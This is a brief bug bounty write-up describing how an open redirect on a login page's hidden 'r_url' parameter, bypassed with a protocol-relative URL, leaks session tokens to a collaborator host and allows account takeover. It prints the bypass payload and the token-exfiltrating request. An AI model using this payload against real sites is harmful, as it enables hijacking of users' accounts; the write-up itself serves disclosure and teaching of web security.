---
title: Account Takeover via Hidden Parameters
draft: false
tags:
  - account-takeover
  - google-dork
  - arjun
  - x8
  - gap
---
This is a open redirect bug from a self hosted bug bounty program that was worth $200.

1. Combine Google Dork methods to find a fresh target no one had touched until now. (Use reports on H1, Bugcrowd, etc)
2. Crawl the website for 10 minutes.
3. Tried to find the user registration function for the website but failed. 
4. Used Google Dork to find the register page: `site:redacted.com "register" OR "signup" OR "registration"`
5. Successfully registered an account.
6. Time to check for hidden parameters on the login page.
7. Used HTTP parameter discovery tool such as `arjun`, `X8`, and `GAP` to discover `r_url` parameter. 
8. Tried Open Redirect to other server but it didn't work. It only accepts their own domain: `https://redacted.com/user/login?r_url=https://collaboratorserver - ERROR`
9. Can easily bypass this: `https://redacted.com/user/login?r_url=//collaboratorserver - OK`
10. After successful login, the collaborator server receives HTTP hit with the token: `GET /?token=xxxxxxxxx HTTP/1.1`
11. Account Takeover by setting the token as the Cookie on browser. 




## References 
- https://cyb3rc4t.medium.com/account-takeover-via-hidden-parameters-in-bbp-f65ce42ca96f